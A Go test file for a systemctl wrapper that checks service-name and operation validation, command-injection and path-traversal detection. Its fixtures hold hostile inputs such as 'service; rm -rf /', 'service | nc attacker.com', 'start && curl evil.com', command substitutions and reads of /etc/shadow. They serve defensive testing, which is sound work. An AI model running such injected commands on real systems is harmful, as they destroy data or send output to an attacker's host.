package eos_unix

import (
	"context"
	"os/exec"
	"runtime"
	"testing"
)

func TestSystemctlAvailability(t *testing.T) {
	// Skip on non-Linux systems where systemctl might not be available
	if runtime.GOOS != "linux" {
		t.Skip("Skipping systemctl tests on non-Linux system")
	}

	t.Run("systemctl command exists", func(t *testing.T) {
		_, err := exec.LookPath("systemctl")
		if err != nil {
			t.Skipf("systemctl not found in PATH: %v", err)
		}
		t.Log("systemctl command is available")
	})
}

func TestSystemctlFunctionSafety(t *testing.T) {
	ctx := context.Background()

	// Note: We can't easily test actual systemctl operations without
	// potentially affecting the system, so we focus on testing
	// the safety and validation aspects

	t.Run("service name validation", func(t *testing.T) {
		// Test that we would validate service names properly
		validServiceNames := []string{
			"ssh",
			"nginx",
			"apache2",
			"docker",
			"postgresql",
		}

		invalidServiceNames := []string{
			"",                  // empty
			"service; rm -rf /", // command injection
			"service && malicious",
			"service | nc attacker.com",
			"service`whoami`",
			"service$(id)",
			"../../../etc/passwd",
		}

		for _, serviceName := range validServiceNames {
			if serviceName == "" {
				t.Error("Empty service name should be invalid")
			}
			if len(serviceName) > 100 {
				t.Error("Service name too long should be invalid")
			}
			t.Logf("Valid service name: %s", serviceName)
		}

		for _, serviceName := range invalidServiceNames {
			// These should be rejected by proper validation
			hasInjection := false
			dangerousChars := []string{";", "&", "|", "`", "$", "(", ")", "<", ">"}

			for _, char := range dangerousChars {
				if containsString(serviceName, char) {
					hasInjection = true
					break
				}
			}

			if serviceName == "" || len(serviceName) > 100 || hasInjection {
				t.Logf("Invalid service name correctly identified: %s", serviceName)
			}
		}
	})

	t.Run("systemctl operation validation", func(t *testing.T) {
		validOperations := []string{
			"start",
			"stop",
			"restart",
			"reload",
			"enable",
			"disable",
			"status",
			"is-active",
			"is-enabled",
		}

		invalidOperations := []string{
			"", // empty
			"start; rm -rf /",
			"stop && malicious",
			"status | nc attacker.com",
			"unknown-operation",
		}

		for _, op := range validOperations {
			if op == "" {
				t.Error("Empty operation should be invalid")
			}
			t.Logf("Valid operation: %s", op)
		}

		for _, op := range invalidOperations {
			// These should be rejected
			if op == "" || containsString(op, ";") || containsString(op, "&") {
				t.Logf("Invalid operation correctly identified: %s", op)
			}
		}
	})

	t.Run("context handling", func(t *testing.T) {
		// Test that systemctl functions handle context properly
		if ctx == nil {
			t.Error("Context should not be nil")
		}

		// Test context with timeout
		timeoutCtx, cancel := context.WithCancel(ctx)
		cancel() // Cancel immediately

		// Operations with cancelled context should handle it gracefully
		if timeoutCtx.Err() != nil {
			t.Log("Cancelled context properly reports error")
		}
		t.Log("Cancelled context handled")
	})
}

func TestSystemctlSecurityValidation(t *testing.T) {
	t.Run("command injection prevention", func(t *testing.T) {
		// Test various injection attempts that should be blocked
		injectionAttempts := []struct {
			serviceName string
			operation   string
			description string
		}{
			{
				serviceName: "ssh; rm -rf /",
				operation:   "start",
				description: "semicolon command injection in service name",
			},
			{
				serviceName: "ssh",
				operation:   "start && curl evil.com",
				description: "command chaining in operation",
			},
			{
				serviceName: "ssh`whoami`",
				operation:   "status",
				description: "backtick command substitution",
			},
			{
				serviceName: "ssh$(id)",
				operation:   "status",
				description: "dollar command substitution",
			},
			{
				serviceName: "ssh\nmalicious",
				operation:   "start",
				description: "newline injection",
			},
		}

		for _, attempt := range injectionAttempts {
			t.Run(attempt.description, func(t *testing.T) {
				// Validate that the injection would be detected
				hasInjection := containsAnyString(attempt.serviceName, []string{";", "&", "|", "`", "$", "\n", "\r"}) ||
					containsAnyString(attempt.operation, []string{";", "&", "|", "`", "$", "\n", "\r"})

				if !hasInjection {
					t.Errorf("Should detect injection in: service=%s, operation=%s",
						attempt.serviceName, attempt.operation)
				} else {
					t.Logf("Correctly detected injection: %s", attempt.description)
				}
			})
		}
	})

	t.Run("path traversal prevention", func(t *testing.T) {
		// Test path traversal attempts that should be blocked
		pathTraversalAttempts := []string{
			"../../../etc/passwd",
			"..\\..\\windows\\system32",
			"/etc/shadow",
			"~/../../etc/hosts",
		}

		for _, serviceName := range pathTraversalAttempts {
			// Should be invalid service names
			if containsString(serviceName, "../") || containsString(serviceName, "/") {
				t.Logf("Correctly identified path traversal attempt: %s", serviceName)
			}
		}
	})
}

// Helper functions for testing
func containsString(s, substr string) bool {
	return len(s) > 0 && len(substr) > 0 && s != substr &&
		len(s) >= len(substr) && s[0:len(substr)] == substr ||
		len(s) > len(substr) && s[len(s)-len(substr):] == substr ||
		findSubstring(s, substr)
}

func findSubstring(s, substr string) bool {
	if len(substr) == 0 {
		return true
	}
	if len(s) < len(substr) {
		return false
	}
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return true
		}
	}
	return false
}

func containsAnyString(s string, substrs []string) bool {
	for _, substr := range substrs {
		if containsString(s, substr) {
			return true
		}
	}
	return false
}

func TestSystemctlPermissions(t *testing.T) {
	t.Run("privilege requirements", func(t *testing.T) {
		// Most systemctl operations require root or sudo privileges
		privileged := IsPrivilegedUser(context.Background())

		t.Logf("Current user privileged: %v", privileged)

		// Operations that typically require privileges
		privilegedOps := []string{"start", "stop", "restart", "enable", "disable"}

		// Operations that might not require privileges
		readOnlyOps := []string{"status", "is-active", "is-enabled"}

		for _, op := range privilegedOps {
			t.Logf("Operation %s typically requires privileges", op)
		}

		for _, op := range readOnlyOps {
			t.Logf("Operation %s might not require privileges", op)
		}
	})
}
